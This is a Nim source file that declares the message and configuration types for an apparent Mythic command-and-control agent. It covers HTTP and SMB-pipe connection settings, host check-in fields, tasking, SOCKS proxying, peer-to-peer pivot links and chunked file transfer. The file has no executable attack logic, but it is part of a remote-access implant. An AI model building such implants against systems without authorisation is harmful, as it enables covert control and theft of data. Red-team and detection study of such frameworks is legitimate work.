import std/options
import std/tables
import json
from puppy import Header
from winim/lean import HANDLE

#[
  This file defines all the structure that
  are required for the communication with mythic
#]#


# This is the information that is required to connect
# to the mythic server
# (this must be somehow extended to support multiple connection profiles)
when defined(PROFILE_SMB):
  type
    ConnectionInformation* = object
      uuid*: string
      pipeName*: string
      encryptionKey*: string
      transferBytesUp*: int     # for setting the max chunk size for up/downloading
      transferBytesDown*: int   # for setting the max chunk size for up/downloading
else:
  type
    ConnectionInformation* = object
      uuid*: string
      remoteEndpoint*: string
      callbackPort*: int
      postEndpoint*: string
      getEndpoint*: string
      getQueryParameter*: string
      httpHeaders*: seq[Header]
      encryptionKey*: string
      transferBytesUp*: int   # for setting the max chunk size for up/downloading
      transferBytesDown*: int # for setting the max chunk size for up/downloading
type
  # This struct holds the main agent data
  # and when building all the configuration
  # information
  AgentInformation* = ref object
    uuid*: string
    isCheckedIn*: bool
    sleepTimeMS*: int
    jitterPer*: int
    tasksToProcess*: seq[Task]
    commands*: Table[uint64, pointer]


  # The Socks Msg
  # Mythic -> Agent
  # Agent -> Mythic
  SocksMsg* = object
    exit*: bool
    server_id*: int
    data*: string


  #[
    This is the delegate struct to SEND
    P2P messages to the Mythic server
    Agent -> Mythic
  ]#
  DelegateMsg* = object
    message*: string
    uuid*: string
    c2_profile*: string

  #[
    This is the delegate struct to for
    receiving P2P answers from mythic
    Mythic -> Agent
  ]#
  DelegateMsgMyth* = object
    message*: string
    uuid*: string
    mythic_uuid*: Option[string]   # this field is only available if the UUIDs don't match

  # Agent -> Mythic
  # Request all available tasks from the
  # Mythic Server
  # The delegates field can be used to send additional
  # data to the server (Socks, Pivoting, ...)
  GetTasking* = object
    action*: string
    tasking_size*: int
    delegates*: seq[DelegateMsg]
    #get_delegate_tasks*: bool

  # The struct for a Mythic task
  Task* = object
    command*: string
    parameters*: string
    timestamp*: float
    id*: string

  # The Mythic server returns a tasking response,
  # that holds all the available tasks that
  # the agent should process
  # Mythic -> Agent
  Tasking* = object
    action*: string
    tasks*: seq[Task]
    delegates*: Option[seq[DelegateMsgMyth]]
    socks*: Option[seq[SocksMsg]] # only occurs if socks is turned on


  # Regular task returned output
  # Agent -> Mythic
  UserOutput* = object
    task_id*: string
    user_output*: string
    completed*: bool
    status*: string
    file_browser*: Option[string]

  # This field is used when
  # uploading or downloading files
  FileUpload* = object
    chunk_size*: BiggestInt
    file_id*: string
    chunk_num*: int
    chunk_data*: string
    full_path*: string

  FileDownload* = object
    total_chunks*: int
    full_path*: string
    host*: string
    is_screenshot*: bool

  FileDownloadContent* = object
    chunk_num*: int
    file_id*: string
    chunk_data*: string

  # the main FileResponse wrapper
  # for up- and downloads
  FileResponseUp* = object
    task_id*: string
    upload*: FileUpload

  FileResponseDown* = object
    task_id*: string
    download*: FileDownload

  FileResponseDownContent* = object
    task_id*: string
    download*: FileDownloadContent


  # The following two objects are
  # for the data that is returned
  # for a specific task
  # -> Its the generic TaskResponse,
  # that can handle  all objects
  # -> Thus its a seq of JsonNodes so every
  # response object must be a Json Node (`%*obj`)
  TaskResponse* = object
    action*: string
    responses*: seq[JsonNode]
    socks*: Option[seq[SocksMsg]]

  # The initial data that is send to the
  # mythic server
  AgentCheckInData* = object
    action*: string
    ip*: string
    os*: string
    user*: string
    host*: string
    pid*: int
    uuid*: string
    architecture*: string
    domain*: string
    integrity_level*: int
    process_name*: string

  # used for the MetaData field in `PivotInformation`
  PipeMetadata* = object
    pipeName*: string
    pipeHandle*: HANDLE

  # the two next objects are used to
  # send the Edge Info to the Mythic Server
  # and additionally track the connected pivots
  # Agent -> Mythic
  PivotInformation* = object
    source*: string
    destination*: string
    metadata*: PipeMetadata
    action*: string
    c2_profile*: string

  LinkedPivots* = object
    user_output*: string
    task_id*: string
    edges*: seq[PivotInformation]


  StatusCodes* = enum
    GenericError,
    UploadSuccessful,
    DestinationExists,
    SourceFileExists,
    SourceFileNonexistent,
    FileMovedSuccessfully,
    SourceFileIsADir,
    SourceFileCopiedSuccessfully,
    FileCopyError,
    CopySuccess

  SpecialCase* = enum
    Default,
    FileBrowser,
    ProcessList
